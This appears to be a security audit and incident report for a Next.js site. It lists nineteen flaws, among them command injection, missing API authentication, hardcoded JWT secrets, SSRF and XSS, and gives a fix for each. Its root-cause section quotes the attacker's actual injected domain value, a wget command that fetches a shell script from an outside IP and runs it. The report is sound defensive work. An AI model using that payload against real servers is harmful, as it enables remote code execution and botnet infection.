# Security Findings Report

---

## Issues Found & Solutions

### 1. Command Injection (CRITICAL - Causing 100% CPU)
**File:** `lib/local.ts` (Line 101) & `lib/cloudflare.ts` (Line 152, 167)
**Issue:** User-provided domain is directly passed to shell command without validation. Attacker injected malware download command.
**Solution:** Add domain validation function + use `spawn()` with array arguments instead of `exec()` with string interpolation.

---

### 2. No Authentication on Article Delete API
**File:** `app/api/articles/delete/route.tsx` (Line 4-21)
**Issue:** Anyone can delete any article by just sending articleId - no login required.
**Solution:** Add JWT token verification before processing delete request.

---

### 3. No Authentication on Article Save API
**File:** `app/api/articles/save/route.ts` (Line 91-184)
**Issue:** Anyone can create articles on any site without authentication.
**Solution:** Add JWT token verification + verify user owns the site.

---

### 4. No Authentication on Article Update API
**File:** `app/api/articles/update/route.tsx` (Line 26-97)
**Issue:** Anyone can update any article without authentication.
**Solution:** Add JWT token verification + verify user owns the article.

---

### 5. No Authentication on Profile API (IDOR)
**File:** `app/api/profile/route.ts` (Line 101-229)
**Issue:** Anyone can read/modify any user's profile by passing userId parameter.
**Solution:** Add JWT verification + check if requesting user matches the userId.

---

### 6. No Authentication on Pages Save API
**File:** `app/api/pages/save/route.ts` (Line 6-56)
**Issue:** Anyone can save/modify static pages (About, Privacy, Terms) on any site.
**Solution:** Add JWT token verification + verify user owns the site.

---

### 7. No Authentication on Get All Sites API (DATA LEAK)
**File:** `app/api/site/get-all/route.ts` (Line 4-40)
**Issue:** Anyone can view ALL sites from ALL users including user emails and site data.
**Solution:** Add JWT verification + filter by user's own sites only.

---

### 8. No Authentication on Get Companies API (DATA LEAK)
**File:** `app/api/companies/get/route.ts` (Line 4-104)
**Issue:** Anyone can view ALL companies from ALL users with full details.
**Solution:** Add JWT verification + filter by user's own companies only.

---

### 9. No Authentication on Freestar API
**File:** `app/api/freestar/insertupdate/route.tsx` (Line 5-104)
**Issue:** Anyone can insert/update analytics records without authentication.
**Solution:** Add JWT token verification or API key validation.

---

### 10. Hardcoded JWT Secret Keys
**Files:**
- `app/api/auth/login/route.ts` (Line 120, 127)
- `app/api/auth/refresh/route.ts` (Line 94, 126, 133)
- `app/api/auth/verify/route.ts` (Line 74)
- `app/api/auth/sessions/route.ts` (Line 17, 68)
- `app/api/auth/logout/route.tsx` (Line 90)
- `app/api/companies/delete/route.ts` (Line 27)
- `app/api/companies/update/route.ts` (Line 35)
- `app/api/companies/toggle-status/route.ts` (Line 34)
- `app/api/site/create/route.ts` (Line 300)
- `app/api/site/update/route.ts` (Line 37) - Empty string fallback!

**Issue:** Fallback secret `'your-secret-key'` allows attacker to forge valid JWT tokens.
**Solution:** Remove all fallback values, require `JWT_SECRET` environment variable, fail if not set.

---

### 11. Server-Side Request Forgery (SSRF)
**File:** `app/api/site/create/route.ts` (Line 512, 575)
**Issue:** Server fetches user-provided logoUrl/faviconUrl without validation. Attacker can access internal services or cloud metadata.
**Solution:** Validate URLs against whitelist of allowed domains, block internal IPs (127.0.0.1, 169.254.169.254, 10.x.x.x, etc.).

---

### 12. No Rate Limiting on Login
**File:** `app/api/auth/login/route.ts`
**Issue:** No limit on login attempts - allows brute force password attacks.
**Solution:** Add rate limiting (e.g., 5 attempts per minute per IP).

---

### 13. No Rate Limiting on OTP Endpoints
**Files:**
- `app/api/auth/send-registration-otp/route.ts`
- `app/api/auth/verify-otp/route.ts`
- `app/api/auth/forgot-password/route.ts`

**Issue:** No limit on OTP requests/attempts - allows OTP bombing and brute force.
**Solution:** Add rate limiting + max 3-5 verification attempts per OTP.

---

### 14. XSS via dangerouslySetInnerHTML
**Files:**
- `app/[category]/[slug]/client.tsx` (Line 112)
- `app/article/[slug]/page.tsx` (Line 59)
- `app/about/page.tsx` (Line 66)
- `app/terms/page.tsx` (Line 58)
- `app/privacy-policy/page.tsx` (Line 60)
- `app/for-advertisers/page.tsx` (Line 60)
- `app/search/[[...slug]]/client.tsx` (Line 206, 228, 257, 270)

**Issue:** HTML content rendered without sanitization - allows script injection (Stored XSS).
**Solution:** Use DOMPurify library to sanitize HTML before rendering.

---

### 15. Missing Security Headers
**File:** `next.config.js` (Line 29-49)
**Issue:** Missing Content-Security-Policy, Strict-Transport-Security, Referrer-Policy headers.
**Solution:** Add CSP, HSTS, Referrer-Policy, Permissions-Policy headers in next.config.js.

---

### 16. Middleware Bypasses API Routes
**File:** `middleware.ts` (Line 63-66)
**Issue:** Matcher pattern `"/((?!api|...)*)"` excludes `/api/*` routes from authentication check.
**Solution:** Add separate API authentication middleware or create wrapper function for protected endpoints.

---

### 17. Password Stored in localStorage
**File:** `app/page.tsx` (Line 41-42)
**Issue:** "Remember me" feature stores password in localStorage - XSS attack can steal it.
**Solution:** Use secure httpOnly cookies instead, or only remember email (not password).

---

### 18. Weak OTP Implementation
**File:** `lib/otpStore.ts`
**Issue:**
- OTPs stored in memory (lost on server restart)
- 6-digit OTP can be brute-forced (1,000,000 combinations)
- No visible attempt limit in code
**Solution:** Store OTP in Redis with TTL, use 8-digit OTP, add max 3 attempts limit.

---

### 19. Prisma Disconnect in Finally Block
**Files:**
- `app/api/companies/get/route.ts` (Line 102)
- `app/api/freestar/insertupdate/route.tsx` (Line 103)
- `app/api/auth/register/route.ts` (Line 431)

**Issue:** `prisma.$disconnect()` in finally block can cause connection issues with connection pooling.
**Solution:** Remove `prisma.$disconnect()` - Prisma handles connection pooling automatically in serverless.

---

## Summary Table

| # | Issue | Severity | File |
|---|-------|----------|------|
| 1 | Command Injection | CRITICAL | lib/local.ts, lib/cloudflare.ts |
| 2 | No Auth - Article Delete | CRITICAL | api/articles/delete/route.tsx |
| 3 | No Auth - Article Save | CRITICAL | api/articles/save/route.ts |
| 4 | No Auth - Article Update | CRITICAL | api/articles/update/route.tsx |
| 5 | No Auth - Profile (IDOR) | CRITICAL | api/profile/route.ts |
| 6 | No Auth - Pages Save | HIGH | api/pages/save/route.ts |
| 7 | No Auth - Get All Sites | HIGH | api/site/get-all/route.ts |
| 8 | No Auth - Get Companies | HIGH | api/companies/get/route.ts |
| 9 | No Auth - Freestar | HIGH | api/freestar/insertupdate/route.tsx |
| 10 | Hardcoded JWT Secrets | HIGH | 11 files |
| 11 | SSRF | HIGH | api/site/create/route.ts |
| 12 | No Rate Limit - Login | HIGH | api/auth/login/route.ts |
| 13 | No Rate Limit - OTP | HIGH | api/auth/*.ts |
| 14 | XSS | MEDIUM | 8 files |
| 15 | Missing Headers | MEDIUM | next.config.js |
| 16 | Middleware Bypass | MEDIUM | middleware.ts |
| 17 | Password in localStorage | MEDIUM | app/page.tsx |
| 18 | Weak OTP | MEDIUM | lib/otpStore.ts |
| 19 | Prisma Disconnect | LOW | 3 files |

---

## Root Cause of 100% CPU

**Attack Chain:**
1. Attacker called `/api/site/create` with malicious domain
2. Domain value: `test.com; wget http://94.154.35.154/weball.sh -O /tmp/x.sh && sh /tmp/x.sh; #`
3. Server executed: `sudo certbot -d test.com; wget...; sh /tmp/x.sh`
4. Malware downloaded and executed
5. Botnet processes consuming all CPU

---

## Immediate Actions

1. **Stop server:** `pm2 stop all`
2. **Kill malware:** `pkill -f "uhavenobotsxd"`
3. **Block IPs:** `94.154.35.154`, `193.142.147.209`
4. **Clean files:** `rm -rf /tmp/*.sh /tmp/*uhavenobotsxd*`
5. **Rotate secrets:** JWT_SECRET, API keys, DB password

---

## Priority Fix Order

| Priority | Issues | Action |
|----------|--------|--------|
| P0 (Today) | 1 | Fix command injection |
| P0 (Today) | 2-9 | Add authentication to all unprotected endpoints |
| P0 (Today) | 10 | Remove hardcoded secrets |
| P1 (This Week) | 11-13 | Fix SSRF, add rate limiting |
| P2 (This Month) | 14-19 | XSS, headers, other fixes |

---

**Total Issues: 19**
**Critical: 5 | High: 8 | Medium: 5 | Low: 1**
